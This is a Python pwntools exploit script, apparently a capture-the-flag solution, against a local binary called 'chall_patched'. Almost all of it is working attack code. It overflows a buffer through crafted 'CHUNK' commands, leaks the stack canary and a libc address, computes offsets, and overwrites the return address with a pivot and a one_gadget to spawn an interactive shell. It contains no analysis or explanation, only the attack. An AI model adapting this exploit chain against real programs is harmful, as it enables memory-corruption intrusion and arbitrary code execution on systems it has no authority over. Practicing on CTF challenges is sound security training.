

from pwn import *

EXE_FILENAME = "./chall_patched"
exe = ELF(EXE_FILENAME)
context.binary = exe

# p = gdb.debug([EXE_FILENAME], gdbscript='''
    # b *0x0000000000401266              
    # b *0x00000000004012B2
# ''')

p = process(EXE_FILENAME)

SPOOFED_RBP_OFFSET = 0x205417
LIBC_LEAK_OFFSET = 0x9caa4
ONE_GADGET_OFFSET = 0xef52b

p.recvuntil(b"CHUNK 1 100")
# p.recvuntil(b"\n\n")

p.sendline(b"CHUNKS 10")
p.recvuntil(b"set nthread to 10\n")
payload = b"A"*72
command = b"CHUNK 200 10 " + payload
p.sendline(command)
canary = p.recvline()
canary = p.recvline()[:-1]
canary = b"\x00" + canary[:7]
canary = int.from_bytes(canary, "little")
print(f"Canary: {hex(canary)}")

command = b"CHUNK 200 10 " + b"A" * (71 + 16)
p.sendline(command)
p.recvline()
leak = p.recvline()[:-1]
leak = int.from_bytes(leak, "little")
libc_base = leak - LIBC_LEAK_OFFSET
spoofed_rbp = libc_base + SPOOFED_RBP_OFFSET
one_gadget = libc_base + ONE_GADGET_OFFSET
print(f"Leak: {hex(leak)}")
print(f"Libc base: {hex(libc_base)}")

command = b"CHUNK 1 1 " + b"A"*72 + p64(canary) + b"B" * 8 + p64(0x00000000004011bd) + p64(spoofed_rbp) +\
            p64(one_gadget)

p.sendline(command)

p.interactive()
